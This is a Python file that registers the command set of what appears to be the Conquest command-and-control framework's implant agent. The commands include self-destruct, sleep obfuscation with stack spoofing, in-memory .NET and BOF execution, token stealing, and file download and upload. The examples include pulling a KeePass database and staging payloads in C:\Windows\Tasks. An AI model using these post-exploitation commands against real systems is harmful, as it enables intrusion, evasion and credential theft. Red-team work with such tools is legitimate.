import conquest

# Built-in modules (always enabled)
exit_cmds = []
exit_cmds.append(
    conquest.createCommand(name="exit", description="Exit the agent.", example="exit process")
        .addArgString("type", "Available options: PROCESS/THREAD.", False, "PROCESS")
)
exit_cmds.append(
    conquest.createCommand(name="self-destruct", description="Exit the agent and delete the executable from disk.", example="self-destruct")
)
conquest.registerModule(name="exit", description="Terminate the agent process or thread.", commands=exit_cmds, builtin=True)

sleep_cmds = []
sleep_cmds.append(
    conquest.createCommand(name="sleep", description="Update sleep delay settings.", example="sleep 5 15")
        .addArgInt("delay", "Delay in seconds.", True)
        .addArgInt("jitter", "Jitter in % (0-100)")
)
sleep_cmds.append(
    conquest.createCommand(name="sleepmask", description="Update sleepmask settings.", example="sleepmask ekko --spoof")
        .addArgString("technique", "Sleep obfuscation technique (NONE, EKKO, ZILEAN, FOLIAGE). Executing without arguments retrieves current sleepmask settings.")
        .addFlagBool("--spoof", "spoof", "Use stack spoofing to obfuscate the call stack")
)
conquest.registerModule(name="sleep", description="Change sleep configuration", commands=sleep_cmds, builtin=True)

link_cmds = []
link_cmds.append(
    conquest.createCommand(name="link", description="Create a link to a SMB agent.", example="link DC01 msagent_1234")
        .addArgString("host", "Host on which the SMB agent is running.", True)
        .addArgString("pipe", "Name of the named pipe (SMB listener).", True)
)
link_cmds.append(
    conquest.createCommand(name="unlink", description="Remove a link to a SMB agent.", example="unlink C804A284")
        .addArgString("agent", "ID of the agent to unlink.", True)
)
conquest.registerModule(name="link", description="Manage linked agents.", commands=link_cmds, builtin=True)   

# Execution modules
conquest.registerModule(name="shell", description="Execute shell commands.", commands=[(
    conquest.createCommand(name="shell", description="Execute a shell command and retrieve the output.", example="shell whoami /all")
        .addArgString("command", "Command to be executed.", True)
        .addArgString("arguments", "Arguments to be passed to the command.")
)])

conquest.registerModule(name="bof", description="Load and execute BOF/COFF files in memory.", commands=[(
    conquest.createCommand(name="bof", description="Execute an object file in memory and retrieve the output.", example="bof /path/to/dir.x64.o C:\\Users")
        .addArgFile("object-file", "Path to the object file to execute.", True)
        .addArgString("arguments", "Arguments to be passed to the object file.")
)])

conquest.registerModule(name="dotnet", description="Load and execute .NET assemblies in memory.", commands=[(
    conquest.createCommand(name="dotnet", description="Execute a .NET assembly in memory and retrieve the output.", example="dotnet /path/to/Seatbelt.exe antivirus")
        .addArgFile("assembly", "Path to the .NET assembly to execute.", True)
        .addArgString("arguments", "Arguments to be passed to the assembly. Arguments are handled as STRING.")
)])

# Looting 
filetransfer_cmds = []
filetransfer_cmds.append(
    conquest.createCommand(name="download", description="Download a file.", example="download C:\\Users\\john\\Documents\\Database.kdbx")
        .addArgString("file", "Path to file to download from the target machine.", True)
)
filetransfer_cmds.append(
    conquest.createCommand(name="upload", description="Upload a file.", example="upload /path/to/payload.exe")
        .addArgFile("file", "Path to file to upload to the target machine.", True)
        .addArgString("destination", "Path to upload the file to. By default, uploads to current directory.")
)
conquest.registerModule(name="filetransfer", description="Upload/download files to/from the target system.", commands=filetransfer_cmds)

conquest.registerModule(name="screenshot", description="Take and retrieve a screenshot of the target desktop.", commands=[
    conquest.createCommand(name="screenshot", description="Take and retrieve a screenshot of the target desktop.", example="screenshot")
])

# Situational awareness
filesystem_cmds = []
filesystem_cmds.append(
    conquest.createCommand(name="pwd", description="Retrieve current working directory.", example="pwd")
)
filesystem_cmds.append(
    conquest.createCommand(name="cd", description="Change current working directory.", example="cd C:\\Windows\\Tasks")
        .addArgString("directory", "Relative or absolute path of the directory to change to.", True)
)
filesystem_cmds.append(
    conquest.createCommand(name="ls", description="List files and directories.", example="ls C:\\Users\\Administrator\\Desktop")
        .addArgString("directory", "Relative or absolute path. Default: current working directory.")
)
filesystem_cmds.append(
    conquest.createCommand(name="rm", description="Remove a file.", example="rm C:\\Windows\\Tasks\\payload.exe")
        .addArgString("file", "Relative or absolute path to the file to delete.", True)
)
filesystem_cmds.append(
    conquest.createCommand(name="rmdir", description="Remove a directory.", example="rmdir C:\\Payloads")
        .addArgString("directory", "Relative or absolute path to the directory to delete.", True)
)
filesystem_cmds.append(
    conquest.createCommand(name="move", description="Move a file or directory.", example="move source.exe C:\\Windows\\Tasks\\destination.exe")
        .addArgString("source", "Source file path.", True)
        .addArgString("destination", "Destination file path.", True)
)
filesystem_cmds.append(
    conquest.createCommand(name="copy", description="Copy a file or directory.", example="copy source.exe C:\\Windows\\Tasks\\destination.exe")
        .addArgString("source", "Source file path.", True)
        .addArgString("destination", "Destination file path.", True)
)
conquest.registerModule(name="filesystem", description="Conduct simple filesystem operations via Windows API.", commands=filesystem_cmds)

systeminfo_cmds = []
systeminfo_cmds.append(
    conquest.createCommand(name="ps", description="Display running processes.", example="ps")
)
systeminfo_cmds.append(
    conquest.createCommand(name="env", description="Display environment variables.", example="env")
)
conquest.registerModule(name="systeminfo", description="Retrieve information about the target system and environment.", commands=systeminfo_cmds)

# Token manipulation
token_cmds = []
token_cmds.append(
    conquest.createCommand(name="make-token", description="Create an access token from username and password.", example="make-token LAB\\john Password123!")
        .addArgString("domain\\username", "Account domain and username. For impersonating local users, use .\\username.", True)
        .addArgString("password", "Account password.", True)
        .addArgInt("logonType", "Logon type (https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types).", False, 9)
)
token_cmds.append(
    conquest.createCommand(name="steal-token", description="Steal the primary access token of a remote process.", example="steal-token 1234")
        .addArgInt("pid", "Process ID of the target process.", True)
)
token_cmds.append(
    conquest.createCommand(name="rev2self", description="Revert to original access token.", example="rev2self")
)
token_cmds.append(
    conquest.createCommand(name="token-info", description="Retrieve information about the current access token.", example="token-info")
)
token_cmds.append(
    conquest.createCommand(name="enable-privilege", description="Enable a token privilege.", example="enable-privilege SeImpersonatePrivilege")
        .addArgString("privilege", "Privilege to enable.", True)
)
token_cmds.append(
    conquest.createCommand(name="disable-privilege", description="Disable a token privilege.", example="disable-privilege SeImpersonatePrivilege")
        .addArgString("privilege", "Privilege to disable.", True)
)
conquest.registerModule(name="token", description="Manipulate Windows access tokens.", commands=token_cmds)